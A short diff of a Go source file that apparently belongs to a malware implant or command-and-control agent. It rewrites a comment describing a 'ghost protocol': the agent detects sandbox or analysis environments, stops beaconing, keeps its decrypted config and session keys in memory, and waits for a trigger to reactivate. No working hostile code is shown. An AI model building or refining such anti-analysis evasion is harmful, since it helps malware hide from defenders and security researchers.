@@ -10,9 +10,11 @@ import (
 	"time"
 )
 
-// Ghost protocol: when the agent detects sandbox/analysis environment,
-// it enters deep hiding mode — stops beaconing, wipes memory, and
-// sets a passive trigger for reactivation.
+// Ghost protocol: when the agent detects a sandbox/analysis environment,
+// it enters a deep-hiding mode — it stops active beaconing by extending its
+// sleep window and records a passive trigger condition for later
+// reactivation. It does NOT wipe in-memory state (the decrypted config and
+// session keys must survive so the agent can recover after the timeout).
 
 var (
 	inGhostMode      int32            // atomic bool
